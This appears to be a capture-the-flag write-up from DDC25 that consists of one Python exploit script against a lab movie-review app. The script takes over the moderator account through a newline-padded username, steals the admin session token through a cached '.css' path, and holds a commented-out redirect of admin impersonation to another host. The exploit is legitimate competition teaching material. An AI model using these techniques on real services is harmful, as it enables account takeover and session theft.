---
title: Film til dig - Boot2Root
date: 2025-03-16 12:52 +/-TTTT
categories: [CTF Writeups, DDC25]
tags: [DDC, Boot2Root]     # TAG names should always be lowercase
---


```python
import requests
import json
import os

s = requests.Session()

server = "http://10.42.3.160"
user = "a@a.com"
passw = "password"

# Load cookies from file if it exists
if os.path.exists("cookies.json"):
    with open("cookies.json", "r") as f:
        cookies = json.load(f)
        requests.utils.add_dict_to_cookiejar(s.cookies, cookies)

def getAdmin():
    # Create account

    payload={"password": passw, "signup_code": "o¤¤--222s-228", "username": user}
    r = s.post(server + '/api/register', json=payload)
    # if not r.status_code == 200:
    #     print(r.status_code)
    #     print(r.text)

    s.post(server + '/api/login', json={"username": user, "password": passw})

    # print(s.cookies.get_dict())

    s.post(server + "/api/update_user", json={"username": "moderator@movie-review.local\n", "password": passw})
    if not r.status_code == 200:
        print(r.status_code)
        print(r.text)


    s.post(server + '/api/login', json={"username":"moderator@movie-review.local","password":"password"})
    # print(s.cookies.get_dict())


    s.post(server + '/api/report_review', json={"review_url":"/api/user/admin/.css"})

    r = s.get(server + '/api/user/admin/.css')
    admin_token = r.json()['session_token']

    s.cookies.clear()  # Clear existing cookies
    cookies = {'session': admin_token}
    requests.utils.add_dict_to_cookiejar(s.cookies, cookies)
    print(s.cookies.get_dict())

    # save cookies to file
    with open("cookies.json", "w") as f:
        json.dump(s.cookies.get_dict(), f)

    # Enabled experiments
    s.post(server + "/api/admin/update_experiments", json={"experiments":True})



def sendPayload():
    # Say hi to myself
    s.post(server + '/api/report_review', json={"review_url":'{"review_url":"/admin/impersonate?username=admin&redirect_to=10.0.240.253%3a8000"}'})


if __name__ == "__main__":
    getAdmin()
    #sendPayload()
```